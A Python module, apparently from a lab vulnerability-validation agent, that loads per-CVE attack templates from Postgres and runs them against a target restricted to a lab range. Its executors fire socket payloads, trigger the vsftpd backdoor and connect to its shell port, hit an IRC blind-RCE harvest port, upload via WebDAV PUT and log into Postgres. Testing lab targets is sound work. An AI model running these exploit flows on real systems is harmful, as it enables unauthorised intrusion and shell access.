import socket
import requests
import psycopg2
import json
import time
from .validator import validate_evidence

# Database Config (Matches docker-compose)
DB_CONFIG = {
    "dbname": "agent_brain",
    "user": "agent",
    "password": "agentpassword",
    "host": "db", 
    "port": 5432
}

def check_scope(target_ip):
    """Safety Guard: Ensure we only attack authorized lab ranges."""
    if not target_ip.startswith("172.18.") and target_ip != "victim":
        raise PermissionError(f"SCOPE VIOLATION: {target_ip}")

def get_template_by_cve(cve_id):
    """Fetch the attack plan from Postgres."""
    try:
        conn = psycopg2.connect(**DB_CONFIG)
        cur = conn.cursor()
        cur.execute("SELECT template_type, params, validation_rule FROM validation_templates WHERE cve_id = %s", (cve_id,))
        row = cur.fetchone()
        conn.close()
        
        if row:
            return {
                "executor": row[0],
                "params": row[1], 
                "validation": row[2]
            }
        return None
    except Exception as e:
        print(f"[!] DB Connection Error: {e}")
        return None

def execute_attack_flow(cve_id, target_ip):
    """
    The Core Agent Loop:
    1. Fetch Template
    2. Execute Payload (Based on Executor Type)
    3. Validate Result
    """
    check_scope(target_ip)
    
    # 1. Fetch Plan
    template = get_template_by_cve(cve_id)
    if not template:
        return {"status": "error", "message": f"No template found for {cve_id}"}

    executor = template["executor"]
    params = template["params"]
    raw_result = ""
    
    # 2. Execute Payload
    try:
        # EXECUTOR A: Standard Socket (e.g., Port 1524)
        if executor == "socket_send":
            with socket.create_connection((target_ip, params["port"]), timeout=params["timeout"]) as s:
                s.sendall(params["payload"].encode())
                time.sleep(params.get("delay", 1)) # Wait for shell execution
                
                # Non-blocking read to get the full buffer
                s.setblocking(False)
                try:
                    while True:
                        chunk = s.recv(4096).decode(errors='ignore')
                        if not chunk: break
                        raw_result += chunk
                except BlockingIOError:
                    pass 

        # EXECUTOR B: Blind RCE with OOB Harvest (e.g., Port 6667)
        elif executor == "socket_blind_rce":
            # Step 1: Fire Trigger
            with socket.create_connection((target_ip, params["port"]), timeout=params["timeout"]) as s:
                time.sleep(params.get("delay", 1)) 
                s.sendall(params["payload"].encode())
                time.sleep(1) # Give OS time to spin up the harvest port

            # Step 2: Harvest Evidence
            with socket.create_connection((target_ip, params["harvest_port"]), timeout=params["timeout"]) as s:
                raw_result = s.recv(4096).decode(errors='ignore')

        # EXECUTOR C: Standard HTTP (e.g., Port 80, 8180)
        elif executor == "http_request":
            url = f"http://{target_ip}:{params['port']}{params['path']}"
            auth = tuple(params["auth"]) if "auth" in params else None
            
            res = requests.request(
                method=params["method"], 
                url=url, 
                data=params.get("body"), 
                auth=auth, 
                timeout=params["timeout"]
            )
            if template["validation"]["type"] == "status_code":
                raw_result = res.status_code
            else:
                raw_result = res.text
        # EXECUTOR D: Trigger on one port, Connect to shell on another (e.g., vsftpd Port 21 -> 6200)
        elif executor == "socket_trigger_and_connect":
            import time
            
            # Step 1: Fire the Trigger
            try:
                with socket.create_connection((target_ip, params["port"]), timeout=params["timeout"]) as s:
                    s.recv(1024) # Consume the FTP welcome banner so it doesn't block
                    s.sendall(params["trigger_payload"].encode())
                    time.sleep(params.get("delay", 1)) # Wait for the backdoor port to open
            except Exception as e:
                return {"status": "fail", "error": f"Trigger failed on port {params['port']}: {str(e)}"}

            # Step 2: Connect to the new Shell
            try:
                with socket.create_connection((target_ip, params["shell_port"]), timeout=params["timeout"]) as s:
                    s.sendall(params["shell_payload"].encode())
                    time.sleep(1) # Give the OS time to run the command
                    
                    s.setblocking(False)
                    try:
                        while True:
                            chunk = s.recv(4096).decode(errors='ignore')
                            if not chunk: break
                            raw_result += chunk
                    except BlockingIOError:
                        pass
            except ConnectionRefusedError:
                return {"status": "fail", "error": f"Connection Refused on shell port {params['shell_port']}. Backdoor not triggered."}
            except Exception as e:
                return {"status": "fail", "error": f"Shell interaction failed: {str(e)}"}
            
        # EXECUTOR E: http_put_and_get (Port 80 WebDAV)
        elif executor == "http_put_and_get":
            base_url = f"http://{target_ip}:{params['port']}{params['put_path']}"
            put_res = requests.put(url=base_url, data=params["payload"], timeout=params["timeout"])
            if put_res.status_code in [200, 201]:
                get_res = requests.get(url=base_url, timeout=params["timeout"])
                raw_result = get_res.text
            else:
                raw_result = f"Upload failed: HTTP {put_res.status_code}"

        # EXECUTOR F: postgres_login (Port 5432)
        elif executor == "postgres_login":
            conn = psycopg2.connect(
                host=target_ip, port=params["port"], user=params["user"],
                password=params["password"], dbname=params["database"], 
                connect_timeout=params["timeout"]
            )
            cur = conn.cursor()
            cur.execute(params["query"])
            raw_result = cur.fetchone()[0]
            cur.close()
            conn.close()
            
    except Exception as e:
        return {"status": "fail", "error": str(e)}

    # 3. Validate Result
    is_success = validate_evidence(template["validation"], raw_result)

    return {
        "cve": cve_id,
        "is_vulnerable": is_success,
        "evidence": str(raw_result)[:200]
    }